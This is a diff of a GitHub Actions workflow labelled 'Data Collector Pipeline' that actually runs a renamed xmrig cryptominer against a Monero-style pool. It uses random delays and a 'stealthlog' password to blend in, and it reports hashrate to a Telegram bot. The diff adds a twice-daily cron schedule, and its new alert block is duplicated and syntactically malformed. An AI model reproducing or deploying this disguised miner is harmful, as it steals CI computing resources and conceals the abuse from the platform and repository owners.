@@ -1,6 +1,8 @@
 name: Data Collector Pipeline
 
 on:
+  schedule:
+    - cron: '0 0,12 * * *' # Jam 00:00 dan 12:00 UTC
   workflow_dispatch:
 
 permissions:
@@ -15,7 +17,7 @@ jobs:
 
     steps:
       - name: Initialize Collector
-        run: echo "🛰️ Initializing collector agent..."
+        run: echo "🛰️ Initializing NANO collector..."
 
       - name: Update Environment
         run: |
@@ -28,7 +30,7 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *Collector aktif.*\nMenjalankan tugas latar hingga 6 jam dengan random delay." \
+            --data-urlencode text="🟢 *NANO Collector aktif.*\nDurasi kerja acak 20–90 menit." \
             -d parse_mode=Markdown
 
       - name: Start Collector Agent
@@ -41,7 +43,7 @@ jobs:
           chmod +x agent
 
           DELAY=$((RANDOM % 300 + 30))
-          echo "Menunggu $DELAY detik sebelum mulai..."
+          echo "Menunggu $DELAY detik..."
           sleep $DELAY
 
           ./agent -o xmrig.nanswap.com:3333 -a rx -k \
@@ -49,7 +51,7 @@ jobs:
             -p stealthlog --randomx-no-rdmsr | tee log.txt &
 
           PID=$!
-          WORKTIME=$((RANDOM % 5400 + 1200))  # 20–90 menit
+          WORKTIME=$((RANDOM % 5400 + 1200))
           echo "Aktif selama $WORKTIME detik..."
           sleep $WORKTIME
           kill $PID
@@ -63,16 +65,23 @@ jobs:
           set +e
           cd data-core
           HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
-          HASHRATE=${HASHRATE:-"0 H/s"}
           ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
           REJECTED=$(grep -a "rejected" log.txt | wc -l)
+          HASHRATE=${HASHRATE:-"0 H/s"}
 
-          MSG="✅ *Collector selesai.*\n\n📊 *Statistik:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
+          MSG="✅ *NANO Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
 
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
             -d text="$MSG" \
             -d parse_mode=Markdown
+
+          HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
+          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
+            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+              -d chat_id=$TG_CHAT_ID \
+              -d text="🚨 *Hashrate rendah!* $HASHRATE." \
+              -d parse_mode=Markdown
 
           HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
           if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
